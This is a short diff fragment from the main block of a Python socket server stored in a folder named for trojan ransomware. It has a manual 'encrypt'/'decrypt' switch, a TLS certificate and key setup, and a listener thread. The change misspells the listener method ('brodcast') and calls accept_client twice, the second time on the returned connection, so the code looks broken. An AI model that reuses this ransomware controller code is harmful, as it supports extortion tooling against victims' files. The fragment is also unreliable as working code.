@@ -140,10 +140,12 @@ if __name__ == "__main__":
     KEY = "D:\python_programmers_clab\TROJAN_RANSOMEWARE/key.pem"
     action = "decrypt"  # enter "encrypt" or "decrypt" manually
 
-    conn = SecureSocketServer(CERT, KEY)
+    server = SecureSocketServer(CERT, KEY)
 
-    threading.Thread(target=conn.listen_to_broadcast_requests,daemon=True).start()
+    threading.Thread(target=server.listen_to_brodcast_requests, daemon=True).start()
     
+    conn = server.accept_client()
+
     conn.accept_client()
     
     with conn:
